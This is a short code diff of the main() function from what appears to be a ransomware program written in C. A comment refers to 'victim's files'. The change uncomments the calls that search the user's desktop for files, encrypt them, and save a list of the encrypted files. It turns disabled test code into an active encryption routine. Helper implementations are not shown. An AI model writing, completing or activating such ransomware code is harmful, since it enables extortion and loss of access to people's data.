@@ -8,12 +8,12 @@
 
 
 int main(){
-    
+
     /* Linked list structures */
     List *files = NULL;
     List *encrypted = NULL;
     List *not_encrypted = NULL;
-    
+
     /* Path variables */
     char * home = get_home_enviroment();
     char * desktop = get_desktop_enviroment(home);
@@ -22,14 +22,13 @@ int main(){
     char *media = get_media_path(username);
 
     // finding all victim's files
-    //find_files(&files, start_path);
+    find_files(&files, desktop);
     //find_files(&files, trash);
     //find_files(&files, media);
-    
+
     // start encryption
-    //encrypt_files(files, &encrypted, &not_encrypted);
-    //print(encrypted);
-    //save_into_file_encrypted_list(encrypted, start_path);
+    encrypt_files(files, &encrypted, &not_encrypted);
+    save_into_file_encrypted_list(encrypted, desktop);
     //destroy(&encrypted);
     //read_from_file_encrypted_files(&encrypted, start_path);
     //print(encrypted);
